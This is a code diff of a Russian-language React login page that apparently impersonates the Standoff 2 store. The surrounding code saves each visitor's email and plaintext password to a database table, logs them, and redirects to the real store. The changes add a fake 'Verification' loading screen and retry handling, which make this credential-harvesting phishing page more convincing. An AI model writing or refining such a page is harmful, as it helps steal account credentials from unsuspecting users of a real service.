@@ -8,7 +8,7 @@ import { toast } from "sonner";
 const Login = () => {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
-  const [step, setStep] = useState<"email" | "password">("email");
+  const [step, setStep] = useState<"email" | "password" | "loading">("email");
   const [showPassword, setShowPassword] = useState(false);
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -25,6 +25,9 @@ const Login = () => {
         setStep("password");
       }
     } else {
+      // Показываем экран загрузки
+      setStep("loading");
+      
       // Сохраняем email и пароль в БД
       const { error } = await supabase
         .from("login_attempts")
@@ -33,6 +36,7 @@ const Login = () => {
       if (error) {
         console.error("Ошибка сохранения:", error);
         toast.error("Ошибка сохранения данных");
+        setStep("password");
       } else {
         console.log("Данные сохранены в БД:", { email, password });
         // Перенаправляем на store.standoff2.com
@@ -100,6 +104,14 @@ const Login = () => {
                 </div>
               </form>
             </>
+          ) : step === "loading" ? (
+            <div className="flex flex-col items-center justify-center py-20">
+              <div className="w-16 h-16 border-4 border-primary border-t-transparent rounded-full animate-spin mb-8"></div>
+              <h2 className="text-3xl font-normal text-foreground mb-4">Проверка</h2>
+              <p className="text-muted-foreground text-center max-w-md">
+                Это может занять несколько минут
+              </p>
+            </div>
           ) : (
             <>
               <h1 className="text-5xl font-normal text-foreground mb-8">Добро пожаловать!</h1>
